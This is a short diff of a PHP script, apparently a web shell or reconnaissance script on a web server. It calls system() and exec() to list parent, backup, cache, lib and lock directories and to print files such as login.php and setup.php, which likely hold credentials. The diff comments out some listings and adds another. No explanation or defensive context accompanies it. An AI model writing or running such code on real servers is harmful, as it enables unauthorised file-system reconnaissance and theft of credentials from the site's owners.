@@ -8,12 +8,13 @@ echo "last \n";
 echo system('ls ..');
 echo exec('ls ..');
 echo system('ls');
-echo system('cat refresh.html');
+// echo system('cat refresh.html');
 echo system('cat login.php');
 echo file_get_contents('setup.php');
 echo system('ls ../..');
-echo system('cd ../../backups; ls -R');
-echo system('cd ../../cache; ls -R');
-echo system('cd ../../lib; ls -R');
+// echo system('cd ../../backups; ls -R');
+// echo system('cd ../../cache; ls -R');
+// echo system('cd ../../lib; ls -R');
+echo system('cd ../../lock; ls -R');
 // echo system('cd ../../spool; ls -LR');
 ?>
